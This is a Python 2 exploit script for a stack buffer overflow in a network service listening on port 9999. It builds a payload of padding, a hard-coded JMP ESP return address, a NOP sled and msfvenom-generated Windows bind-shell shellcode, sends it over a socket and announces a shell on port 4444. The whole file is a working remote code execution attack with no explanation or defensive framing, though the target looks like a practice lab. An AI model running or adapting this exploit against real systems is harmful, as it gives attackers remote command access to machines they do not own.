#!/usr/bin/python

import socket
import sys
import time

#JMPESP at 311712F3
jmpesp = "\xF3\x12\x17\x31"

#msfvenom -p windows/shell_bind_tcp LPORT=4444 -b "\x00\x0a\x0d\x40" -f py
buf =  ""
buf += "\xbe\xac\x10\x20\xc5\xdb\xc2\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x53\x83\xe8\xfc\x31\x70\x0e\x03\xdc\x1e\xc2"
buf += "\x30\xe0\xf7\x80\xbb\x18\x08\xe5\x32\xfd\x39\x25\x20"
buf += "\x76\x69\x95\x22\xda\x86\x5e\x66\xce\x1d\x12\xaf\xe1"
buf += "\x96\x99\x89\xcc\x27\xb1\xea\x4f\xa4\xc8\x3e\xaf\x95"
buf += "\x02\x33\xae\xd2\x7f\xbe\xe2\x8b\xf4\x6d\x12\xbf\x41"
buf += "\xae\x99\xf3\x44\xb6\x7e\x43\x66\x97\xd1\xdf\x31\x37"
buf += "\xd0\x0c\x4a\x7e\xca\x51\x77\xc8\x61\xa1\x03\xcb\xa3"
buf += "\xfb\xec\x60\x8a\x33\x1f\x78\xcb\xf4\xc0\x0f\x25\x07"
buf += "\x7c\x08\xf2\x75\x5a\x9d\xe0\xde\x29\x05\xcc\xdf\xfe"
buf += "\xd0\x87\xec\x4b\x96\xcf\xf0\x4a\x7b\x64\x0c\xc6\x7a"
buf += "\xaa\x84\x9c\x58\x6e\xcc\x47\xc0\x37\xa8\x26\xfd\x27"
buf += "\x13\x96\x5b\x2c\xbe\xc3\xd1\x6f\xd7\x20\xd8\x8f\x27"
buf += "\x2f\x6b\xfc\x15\xf0\xc7\x6a\x16\x79\xce\x6d\x59\x50"
buf += "\xb6\xe1\xa4\x5b\xc7\x28\x63\x0f\x97\x42\x42\x30\x7c"
buf += "\x92\x6b\xe5\xe9\x9a\xca\x56\x0c\x67\xac\x06\x90\xc7"
buf += "\x45\x4d\x1f\x38\x75\x6e\xf5\x51\x1e\x93\xf6\x4c\x83"
buf += "\x1a\x10\x04\x2b\x4b\x8a\xb0\x89\xa8\x03\x27\xf1\x9a"
buf += "\x3b\xcf\xba\xcc\xfc\xf0\x3a\xdb\xaa\x66\xb1\x08\x6f"
buf += "\x97\xc6\x04\xc7\xc0\x51\xd2\x86\xa3\xc0\xe3\x82\x53"
buf += "\x60\x71\x49\xa3\xef\x6a\xc6\xf4\xb8\x5d\x1f\x90\x54"
buf += "\xc7\x89\x86\xa4\x91\xf2\x02\x73\x62\xfc\x8b\xf6\xde"
buf += "\xda\x9b\xce\xdf\x66\xcf\x9e\x89\x30\xb9\x58\x60\xf3"
buf += "\x13\x33\xdf\x5d\xf3\xc2\x13\x5e\x85\xca\x79\x28\x69"
buf += "\x7a\xd4\x6d\x96\xb3\xb0\x79\xef\xa9\x20\x85\x3a\x6a"
buf += "\x50\xcc\x66\xdb\xf9\x89\xf3\x59\x64\x2a\x2e\x9d\x91"
buf += "\xa9\xda\x5e\x66\xb1\xaf\x5b\x22\x75\x5c\x16\x3b\x10"
buf += "\x62\x85\x3c\x31"

hostname = sys.argv[1]

buffer = "A" * 524 + jmpesp + "\x90" * 20 + buf + "\x90" * 50 + "L" * (1024 - 528 - 70 - len(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print "[*] Connecting to the server..."
    s.connect((hostname,9999))
except:
    print "[!] The exploit wasn't capable of finding an open port."
    sys.exit(1)

s.send(buffer)
print "[*] Sending buffer...please wait."
time.sleep(5)
response = s.recv(2000)
print response
print "[+] A bind shell should be open on port 4444!"
s.close()
